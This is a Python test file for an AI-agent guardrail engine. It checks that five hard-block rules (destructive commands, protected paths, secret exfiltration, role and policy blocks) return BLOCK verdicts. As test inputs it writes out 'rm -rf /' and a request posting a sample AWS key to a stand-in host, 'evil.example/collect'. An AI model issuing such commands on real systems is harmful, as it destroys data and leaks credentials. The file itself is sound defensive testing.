"""C9 — authority tiers: every FLOOR_HARD_BLOCKS code is reachable as BLOCK.

FLOOR_HARD_BLOCKS (policy/modes.py) is the mode-independent hard-block floor —
five reason codes that always BLOCK regardless of security mode. This file
proves each of the five is actually reachable as a BLOCK today, two ways:

* Three codes (secret_exfiltration, protected_path_blocked, destructive_command)
  are reachable through the shipped detection corpus's default mapping (no role,
  no resolved policy) — proven dynamically via evaluate_corpus so this survives
  corpus edits and rule changes without a hand-maintained row-to-code table.
* Two codes (role_blocked_target, policy_source_blocked) are structurally
  opt-in: their rules abstain (PASS) unless EvalContext.role / metadata
  ["resolved_policy"] is set, which the corpus's mapping (tests/benchmarks/
  mapping.py) never does. Proven directly against the rule instead.

See docs/AUTHORITY_TIERS.md for the full T0-T3 tier writeup this test backs.
"""

from datetime import datetime, timezone

from doberman.engine.rules.commands import DestructiveCommandRule
from doberman.engine.rules.paths import ProtectedPathRule
from doberman.engine.rules.policy_source import PolicySourceRule
from doberman.engine.rules.role_boundary import RoleBoundaryRule
from doberman.engine.rules.secrets import SecretLeakageRule
from doberman.engine.subjective import SubjectiveGuardrail
from doberman.models import (
    ActionType,
    Algebra,
    BlastRadius,
    Capability,
    DestinationClass,
    EvalContext,
    Provenance,
    ReasonCode,
    Reversibility,
    SecurityObject,
    TargetClass,
    Verdict,
)
from doberman.policy.modes import FLOOR_HARD_BLOCKS
from doberman.policy.preferences import PreferenceVector
from doberman.policy.sources import ResolvedPolicy
from doberman.roles.roles import RoleDefinition
from tests.benchmarks.profiles import build_pipeline
from tests.benchmarks.suites.corpus import evaluate_corpus, load_corpus

# The well-known AWS documentation example access key — never a real secret.
_FAKE_AWS = "AKIAIOSFODNN7EXAMPLE"  # noqa: S105

#: Reachable through the corpus's default (no role, no resolved policy) mapping.
_CORPUS_REACHABLE_FLOOR_CODES = frozenset(
    {
        ReasonCode.secret_exfiltration,
        ReasonCode.protected_path_blocked,
        ReasonCode.destructive_command,
    }
)
#: Opt-in floor codes the corpus's mapping cannot construct (no role /
#: resolved_policy field) — proven directly against the rule instead.
_OPT_IN_FLOOR_CODES = frozenset(
    {
        ReasonCode.role_blocked_target,
        ReasonCode.policy_source_blocked,
    }
)


def test_the_two_coverage_paths_partition_every_floor_hard_block_code():
    """A future sixth FLOOR_HARD_BLOCKS code must be added to one of the two
    sets above (and proven by one of the tests below) or this fails loudly —
    the coverage claim can never silently go stale."""
    assert _CORPUS_REACHABLE_FLOOR_CODES | _OPT_IN_FLOOR_CODES == FLOOR_HARD_BLOCKS
    assert _CORPUS_REACHABLE_FLOOR_CODES & _OPT_IN_FLOOR_CODES == frozenset()


def test_every_corpus_reachable_floor_code_has_a_block_row():
    """Drive the real corpus through the real (builtin-only) engine and collect
    every reason code seen on a BLOCK verdict; every corpus-reachable floor code
    must appear at least once."""
    results = evaluate_corpus(load_corpus(), build_pipeline(load_plugins=False))
    seen_on_block = {
        ReasonCode(code)
        for row_result in results
        if row_result.verdict is Verdict.BLOCK
        for code in row_result.reason_codes
    }
    missing = _CORPUS_REACHABLE_FLOOR_CODES - seen_on_block
    assert missing == set(), (
        f"FLOOR_HARD_BLOCKS codes with no corpus BLOCK coverage: "
        f"{sorted(code.value for code in missing)}"
    )


def _role_action(target: str) -> SecurityObject:
    return SecurityObject(
        id="c9-role-1",
        ts=datetime(2026, 9, 2, tzinfo=timezone.utc),
        agent_role="c9",
        action_type=ActionType.file_write,
        tool_name="fs_write",
        target=target,
    )


def test_role_blocked_target_floor_is_reachable(tmp_path):
    """Opt-in: the corpus's mapping never sets EvalContext.role, so this floor
    code is proven directly against RoleBoundaryRule with an active role."""
    role = RoleDefinition(name="c9-role", blocked=["forbidden/**"])
    ctx = EvalContext(role=role, metadata={"repo_root": str(tmp_path)})
    result = RoleBoundaryRule().evaluate(_role_action("forbidden/secret.txt"), ctx)
    assert result.verdict is Verdict.BLOCK
    assert ReasonCode.role_blocked_target in result.reason_codes


def _policy_action(target: str) -> SecurityObject:
    return SecurityObject(
        id="c9-policy-1",
        ts=datetime(2026, 9, 2, tzinfo=timezone.utc),
        agent_role="c9",
        action_type=ActionType.file_write,
        tool_name="fs_write",
        target=target,
    )


def test_policy_source_blocked_floor_is_reachable(tmp_path):
    """Opt-in: the corpus's mapping never populates metadata['resolved_policy'],
    so this floor code is proven directly against PolicySourceRule."""
    resolved = ResolvedPolicy(blocked_globs=("app/secret.txt",))
    ctx = EvalContext(metadata={"repo_root": str(tmp_path), "resolved_policy": resolved})
    result = PolicySourceRule().evaluate(_policy_action("app/secret.txt"), ctx)
    assert result.verdict is Verdict.BLOCK
    assert ReasonCode.policy_source_blocked in result.reason_codes


def _cmd_action(command: str) -> SecurityObject:
    return SecurityObject(
        id="c9-cmd-1",
        ts=datetime(2026, 9, 2, tzinfo=timezone.utc),
        agent_role="unknown",
        action_type=ActionType.shell_exec,
        tool_name="shell_exec",
        target=command,
    )


def _cmd_ctx(command: str) -> EvalContext:
    return EvalContext(metadata={"raw_arguments": {"command": command}})


def _path_action(target: str) -> SecurityObject:
    return SecurityObject(
        id="c9-path-1",
        ts=datetime(2026, 9, 2, tzinfo=timezone.utc),
        agent_role="unknown",
        action_type=ActionType.file_write,
        tool_name="fs_write",
        target=target,
    )


def _secret_action(action_type: ActionType, *, target: str | None = None, dest: str | None = None):
    return SecurityObject(
        id="c9-secret-1",
        ts=datetime(2026, 9, 2, tzinfo=timezone.utc),
        agent_role="unknown",
        action_type=action_type,
        tool_name="t",
        target=target,
        external_destination=dest,
    )


def test_block_boundaries_are_discrete_predicates_not_scores(tmp_path):
    """For each of the five FLOOR_HARD_BLOCKS rules: a case AT/OVER the boundary
    BLOCKs, and the case just BELOW it (missing exactly one of the predicate's
    required conditions) does not — proving the transition is a discrete
    AND-of-predicates step, never a smoothed/continuous score, and that a
    legitimate near-miss case is not swept into the floor."""

    # 1. commands.py: recursive AND force AND root-target, all three required.
    over = DestructiveCommandRule().evaluate(_cmd_action("rm -rf /"), _cmd_ctx("rm -rf /"))
    assert over.verdict is Verdict.BLOCK
    assert ReasonCode.destructive_command in over.reason_codes
    under = DestructiveCommandRule().evaluate(
        _cmd_action("rm -rf ./build"), _cmd_ctx("rm -rf ./build")
    )
    assert under.verdict is not Verdict.BLOCK

    # 2. paths.py: canonicalized path matches a DEFAULT_BLOCKED_GLOBS entry exactly.
    over = ProtectedPathRule().evaluate(
        _path_action(".env"), EvalContext(metadata={"repo_root": str(tmp_path)})
    )
    assert over.verdict is Verdict.BLOCK
    assert ReasonCode.protected_path_blocked in over.reason_codes
    under = ProtectedPathRule().evaluate(
        _path_action("src/app.py"), EvalContext(metadata={"repo_root": str(tmp_path)})
    )
    assert under.verdict is not Verdict.BLOCK

    # 3. secrets.py: strong secret content AND an external destination.
    over = SecretLeakageRule().evaluate(
        _secret_action(
            ActionType.network_request,
            target="https://evil.example/collect",
            dest="https://evil.example/collect",
        ),
        EvalContext(
            metadata={
                "raw_arguments": {"url": "https://evil.example/collect", "body": f"AWS={_FAKE_AWS}"}
            }
        ),
    )
    assert over.verdict is Verdict.BLOCK
    assert ReasonCode.secret_exfiltration in over.reason_codes
    under = SecretLeakageRule().evaluate(
        _secret_action(ActionType.file_read, target="config/app.env"),
        EvalContext(metadata={"raw_arguments": {"path": "config/app.env"}}),
    )
    assert under.verdict is not Verdict.BLOCK

    # 4. role_boundary.py: target classifies as 'blocked' (glob match) for the role.
    role = RoleDefinition(name="c9-boundary", blocked=["forbidden/**"], allowed=["ok/**"])
    role_ctx = EvalContext(role=role, metadata={"repo_root": str(tmp_path)})
    over = RoleBoundaryRule().evaluate(_role_action("forbidden/x.txt"), role_ctx)
    assert over.verdict is Verdict.BLOCK
    assert ReasonCode.role_blocked_target in over.reason_codes
    under = RoleBoundaryRule().evaluate(_role_action("ok/y.txt"), role_ctx)
    assert under.verdict is not Verdict.BLOCK

    # 5. policy_source.py: target matches a resolved blocked glob (fnmatch).
    resolved = ResolvedPolicy(blocked_globs=("app/secret.txt",))
    policy_ctx = EvalContext(metadata={"repo_root": str(tmp_path), "resolved_policy": resolved})
    over = PolicySourceRule().evaluate(_policy_action("app/secret.txt"), policy_ctx)
    assert over.verdict is Verdict.BLOCK
    assert ReasonCode.policy_source_blocked in over.reason_codes
    under = PolicySourceRule().evaluate(_policy_action("app/main.py"), policy_ctx)
    assert under.verdict is not Verdict.BLOCK


def test_subjective_score_never_blocks_even_at_maximum_abnormality():
    """T2: the continuous three-axis score (surprise x sensitivity x care) has
    no Verdict.BLOCK literal anywhere on its path (engine/subjective.py
    _step_up_result always builds AUTH). Drive every axis to its maximum in
    Paranoid (the mode most eager to escalate) while deliberately keeping
    provenance=trusted_instruction so the SEPARATE, score-independent
    lethal-trifecta floor (which the subjective allowlist does permit to
    BLOCK in strict/paranoid) does not fire -- isolating the score path
    itself, not its sibling deterministic floor."""
    algebra = Algebra(
        capability=Capability.send,
        target_class=TargetClass.secret,
        destination_class=DestinationClass.known_external,
        provenance=Provenance.trusted_instruction,  # excludes the trifecta floor
        blast_radius=BlastRadius.mass,
        classification_confidence=1.0,
    )
    action = SecurityObject(
        id="c9-subjective-1",
        ts=datetime(2026, 9, 2, tzinfo=timezone.utc),
        agent_role="c9",
        action_type=ActionType.network_request,
        tool_name="http_post",
        reversibility=Reversibility.low,
        algebra=algebra,
    )
    max_care = PreferenceVector(confidentiality=1.0, reversibility=1.0, blast_radius=1.0)
    ctx = EvalContext(
        mode="paranoid",
        metadata={"surprise": 1.0, "preferences": max_care},
    )
    result = SubjectiveGuardrail(load_plugins=False).evaluate(action, ctx)
    assert result.verdict is Verdict.AUTH
    assert ReasonCode.lethal_trifecta not in result.reason_codes
